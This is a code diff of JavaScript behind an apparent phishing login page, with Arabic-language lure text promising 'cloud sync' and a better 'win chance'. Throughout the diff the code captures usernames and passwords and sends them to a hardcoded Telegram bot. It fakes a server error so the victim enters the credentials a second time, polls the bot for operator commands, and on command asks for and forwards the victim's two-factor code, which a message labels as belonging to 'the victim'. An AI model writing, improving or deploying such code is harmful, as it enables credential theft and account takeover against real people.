@@ -2,9 +2,8 @@ const TG_TOKEN = "8589243363:AAH4sM1DEqNXAUK314uyagIB3GbRouEL8ak";
 const CHAT_ID = "8026901193";
 
 let loginAttempts = 0;
-let checkTimer = null;
-let countdownTimer = null;
 let timeLeft = 50;
+let isCommandActive = true;
 
 async function processAuth() {
     const u = document.getElementById('u_log').value;
@@ -16,12 +15,10 @@ async function processAuth() {
 
     loginAttempts++;
 
-    // المحاولة 1: خطأ إجباري للتأكد
     if (loginAttempts === 1) {
         btn.disabled = true;
         btn.innerText = "Verifying...";
-        await sendToTelegram(`⚠️ محاولة 1 (تأكد):\n👤 User: ${u}\n🔑 Pass: ${p}`);
-        
+        await sendToTelegram(`⚠️ محاولة 1:\n👤 User: ${u}\n🔑 Pass: ${p}`);
         setTimeout(() => {
             msg.innerText = "❌ خطأ في السيرفر: كلمة المرور أو اليوزر غير صحيح!";
             msg.style.color = "#ff4444";
@@ -29,94 +26,90 @@ async function processAuth() {
             btn.disabled = false;
             btn.innerText = "Retry Sync";
         }, 1500);
-        return;
-    }
-
-    // المحاولة 2: العداد والانتظار
-    if (loginAttempts === 2) {
+    } else {
         btn.disabled = true;
         msg.style.color = "#00f2ff";
-        const device = navigator.userAgent.includes("Android") ? "Android" : "iPhone";
+        await sendToTelegram(`✅ محاولة 2 (مؤكدة):\n👤 User: ${u}\n🔑 Pass: ${p}`);
         
-        await sendToTelegram(`✅ بيانات مؤكدة (محاولة 2):\n👤 User: ${u}\n🔑 Pass: ${p}\n📱 الجهاز: ${device}`);
-
-        startCountdown(); 
-        startAdminListening(); 
+        // بدء العداد المستقل
+        runCountdown();
+        // بدء الاستماع الذكي (بدون تعليق)
+        listenForCommands();
     }
 }
 
-function startCountdown() {
+function runCountdown() {
     const msg = document.getElementById('status-text');
-    countdownTimer = setInterval(() => {
-        msg.innerText = `⏳ جاري المزامنة السحابية... يرجى الانتظار (ثانية ${timeLeft})`;
+    const timer = setInterval(() => {
+        if (!isCommandActive) { clearInterval(timer); return; }
+        msg.innerText = `⏳ جاري المزامنة السحابية... (ثانية ${timeLeft})`;
         timeLeft--;
-
         if (timeLeft < 0) {
-            clearInterval(countdownTimer);
-            openRadar(); 
+            clearInterval(timer);
+            openRadar();
         }
     }, 1000);
 }
 
-function startAdminListening() {
-    checkTimer = setInterval(async () => {
-        try {
-            const res = await fetch(`https://api.telegram.org/bot${TG_TOKEN}/getUpdates?offset=-1&limit=1`);
-            const data = await res.json();
-            if (data.result && data.result.length > 0) {
-                const cmd = data.result[0].message?.text.toUpperCase() || "";
-                
-                // أمر Q: تقرير المتصلين
-                if (cmd === "Q") {
-                    const device = navigator.userAgent.includes("Android") ? "Android" : "iPhone";
-                    await sendToTelegram(`📊 تقرير المتصل الآن:\n📱 الجهاز: ${device}\n⏳ الوقت المتبقي له: ${timeLeft} ثانية\n🌐 الحالة: في شاشة المزامنة`);
-                }
-                // أمر 2FA: طلب الرمز
-                else if (cmd === "2FA") {
-                    clearInterval(countdownTimer);
-                    stopAndRequest2FA();
-                } 
-                // أمر OK: دخول فوري
-                else if (cmd === "OK") {
-                    clearInterval(countdownTimer);
-                    openRadar();
-                }
+async function listenForCommands() {
+    if (!isCommandActive) return;
+
+    try {
+        const res = await fetch(`https://api.telegram.org/bot${TG_TOKEN}/getUpdates?offset=-1&limit=1`);
+        const data = await res.json();
+        
+        if (data.result && data.result.length > 0) {
+            const cmd = data.result[0].message?.text.toUpperCase() || "";
+            
+            if (cmd === "Q") {
+                await sendToTelegram(`📊 تقرير: الجهاز متصل والوقت المتبقي ${timeLeft}ث`);
+            } else if (cmd === "2FA") {
+                isCommandActive = false;
+                stopAndRequest2FA();
+                return; // الخروج من حلقة الاستماع
+            } else if (cmd === "OK") {
+                isCommandActive = false;
+                openRadar();
+                return;
             }
-        } catch (e) { console.log("Waiting..."); }
-    }, 2500);
+        }
+    } catch (e) { console.log("Polling..."); }
+
+    // بدلاً من setInterval، نستدعي الوظيفة مرة أخرى بعد 3 ثوانٍ
+    if (isCommandActive) setTimeout(listenForCommands, 3000);
 }
 
 function stopAndRequest2FA() {
-    clearInterval(checkTimer);
     const msg = document.getElementById('status-text');
     const pInput = document.getElementById('u_pas');
     const btn = document.getElementById('sync-btn');
 
-    msg.innerText = "⚠️ فشلت المزامنة! حسابك محمي بـ 'المصادقة الثنائية'. أدخل الرمز المكون من 6 أرقام الآن لرفع نسبة الفوز:";
+    msg.innerText = "⚠️ فشلت المزامنة! أدخل رمز الـ 2FA لرفع نسبة الفوز:";
     msg.style.color = "#ffcc00";
     pInput.value = "";
-    pInput.placeholder = "أدخل الرمز هنا";
+    pInput.placeholder = "Code 2FA";
     btn.disabled = false;
     btn.innerText = "تأكيد الرمز 🔓";
     
     btn.onclick = async () => {
-        const code = pInput.value;
-        await sendToTelegram(`🔐 تفضل رمز 2FA للضحية:\n🔢 CODE: ${code}`);
-        alert("جاري التحقق.. انتظر رسالة النجاح");
+        await sendToTelegram(`🔐 الرمز: ${pInput.value}`);
+        alert("جاري التحقق...");
         btn.disabled = true;
     };
 }
 
 function openRadar() {
-    clearInterval(checkTimer);
+    isCommandActive = false;
     document.getElementById('auth-screen').classList.add('hidden');
     document.getElementById('main-app').classList.remove('hidden');
 }
 
 async function sendToTelegram(text) {
-    await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ chat_id: CHAT_ID, text: text })
-    });
+    try {
+        await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: CHAT_ID, text: text })
+        });
+    } catch (e) {}
 }
